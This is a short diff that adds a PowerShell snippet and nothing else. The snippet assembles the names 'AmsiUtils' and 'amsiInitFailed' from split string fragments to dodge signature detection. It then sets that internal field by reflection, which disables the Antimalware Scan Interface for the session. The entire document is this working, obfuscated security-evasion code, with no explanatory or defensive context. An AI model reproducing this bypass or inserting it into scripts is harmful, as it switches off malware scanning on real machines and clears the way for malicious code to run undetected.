@@ -1,0 +1,5 @@
+$a = [String]::Join('', 'Sy','stem.','Man','agement.Aut','omation.A','msiU','tils')
+$b = [String]::Join('', 'am','siIn','itF','ailed')
+$t = [Ref].Assembly.GetType($a)
+$f = $t.GetField($b, 'NonPublic,Static')
+$f.SetValue($null, $true)
